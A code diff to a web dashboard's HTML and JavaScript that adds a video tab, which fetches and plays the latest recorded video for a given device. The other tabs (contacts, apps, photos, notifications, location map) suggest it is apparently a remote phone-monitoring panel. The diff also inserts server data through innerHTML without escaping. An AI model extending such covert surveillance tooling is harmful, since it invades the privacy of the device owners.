@@ -444,6 +444,27 @@
             font-size: 0.8em;
         }
 
+        /* Video Container */
+        .video-container {
+            padding: 20px;
+            text-align: center;
+        }
+
+        .video-player {
+            width: 100%;
+            max-height: 400px;
+            border-radius: 10px;
+            background: #000;
+        }
+
+        .video-info {
+            padding: 15px;
+            background: #f7fafc;
+            border-radius: 10px;
+            margin: 15px;
+            text-align: left;
+        }
+
         /* Map */
         #map {
             height: 400px;
@@ -786,6 +807,10 @@
             <div class="tab" onclick="showTab('media')">
                 <i class="fas fa-image"></i> Photos
             </div>
+            <!-- 🔥 NEW VIDEO TAB -->
+            <div class="tab" onclick="showTab('video')">
+                <i class="fas fa-video"></i> Video
+            </div>
             <div class="tab" onclick="showTab('battery')">
                 <i class="fas fa-battery-half"></i> Battery
             </div>
@@ -874,9 +899,22 @@
             </table>
         </div>
 
-        <!-- Media Tab -->
+        <!-- Media Tab (Photos) -->
         <div id="mediaTab" class="data-content" style="display: none;">
             <div class="photo-grid" id="photoGrid"></div>
+        </div>
+
+        <!-- 🔥 NEW VIDEO TAB -->
+        <div id="videoTab" class="data-content" style="display: none;">
+            <div class="video-container">
+                <video id="latestVideo" class="video-player" controls>
+                    <source src="" type="video/mp4">
+                    Your browser does not support the video tag.
+                </video>
+            </div>
+            <div class="video-info" id="videoInfo">
+                <p>No video selected</p>
+            </div>
         </div>
 
         <!-- Battery Tab -->
@@ -1153,10 +1191,38 @@
                 updateBatteryData(data.data.battery);
                 updateNetworkData(data.data.network);
                 updateNotificationsData(data.data.notifications);
+                // 🔥 Load video separately
+                loadVideo(deviceId);
             }
         } catch (error) {
             console.error('Error loading device data:', error);
             showToast('Error loading device data', 'error');
+        }
+    }
+
+    // ============= LOAD VIDEO =============
+    async function loadVideo(deviceId) {
+        try {
+            const response = await fetch(`/api/video/${deviceId}`);
+            const data = await response.json();
+
+            if (data.success) {
+                const videoElement = document.getElementById('latestVideo');
+                const videoInfo = document.getElementById('videoInfo');
+
+                videoElement.src = data.url;
+                videoElement.load();
+
+                videoInfo.innerHTML = `
+                    <p><strong>Type:</strong> ${data.type || 'Unknown'}</p>
+                    <p><strong>Time:</strong> ${new Date(data.timestamp).toLocaleString()}</p>
+                `;
+            } else {
+                document.getElementById('videoInfo').innerHTML = '<p>No video found</p>';
+            }
+        } catch (error) {
+            console.error('Error loading video:', error);
+            document.getElementById('videoInfo').innerHTML = '<p>Error loading video</p>';
         }
     }
 
@@ -1467,6 +1533,7 @@
         document.getElementById('contactsTab').style.display = 'none';
         document.getElementById('appsTab').style.display = 'none';
         document.getElementById('mediaTab').style.display = 'none';
+        document.getElementById('videoTab').style.display = 'none';
         document.getElementById('batteryTab').style.display = 'none';
         document.getElementById('networkTab').style.display = 'none';
         document.getElementById('notificationsTab').style.display = 'none';
